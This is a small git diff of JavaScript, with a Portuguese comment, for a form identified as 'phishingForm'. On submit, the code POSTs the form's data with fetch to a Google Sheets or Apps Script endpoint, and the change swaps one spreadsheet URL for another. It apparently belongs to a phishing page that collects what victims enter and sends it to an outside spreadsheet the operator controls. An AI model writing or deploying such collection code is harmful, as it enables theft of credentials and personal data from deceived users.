@@ -5,7 +5,7 @@ document.getElementById("phishingForm").addEventListener("submit", function(even
     const data = new FormData(form);
 
     // Substitua abaixo pela URL do seu Apps Script publicado
-    const scriptURL = "https://docs.google.com/spreadsheets/d/1fKBUGr0yqB-YBkCyZ0LV3ApTiHwmh2WV-7TXBfmrinE/edit?usp=sharing";
+    const scriptURL = "https://docs.google.com/spreadsheets/d/1fKBUGr0yqB-YBkCyZ0LV3ApTiHwmh2WV-7TXBfmrinE/edit?gid=0#gid=0";
 
     fetch(scriptURL, {
         method: "POST",
